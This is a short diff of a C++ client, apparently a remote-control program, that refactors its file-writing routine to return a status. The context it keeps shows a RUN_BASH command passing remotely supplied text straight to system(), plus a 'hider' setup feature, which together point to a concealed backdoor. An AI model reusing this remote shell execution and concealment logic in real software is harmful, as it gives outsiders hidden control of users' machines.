@@ -21,7 +21,7 @@ int main(int argc, char * argv[]) {
         loopIter(client, swm, hiderManager);
     }
 
-    return 0;
+    return EXIT_SUCCESS;
 }
 
 void testSoftwareManeger() {
@@ -33,16 +33,19 @@ void testSoftwareManeger() {
 
 }
 
-void fileWrite(Client& client, std::string param, SoftwareManeger& swm)
+Status fileWrite(Client& client, std::string param, SoftwareManeger& swm)
 {
     bool cont = true;
     bool isAppend = false;
     char buffer[BUFFER_SIZE] = {0};
-    while (client.recvData(buffer) > 0)
+    Status res = SUCCSESS;
+    
+    while (client.recvData(buffer) > 0 && res == SUCCSESS)
     {
-        swm.chunkWrite(param, isAppend, buffer);
+        res = swm.chunkWrite(param, isAppend, buffer);
         isAppend = true;
     }
+    return res;
 }
 
 
@@ -67,7 +70,7 @@ void loopIter(Client& client, SoftwareManeger& swm, HiderManeger hiderManeger)
         break;
 
     case RUN_BASH:
-        system(param.c_str());
+        system(param.c_str()); // maybe we shoud abandon this option, it might be SUS
         break;
 
     case HIDER_SETUP:
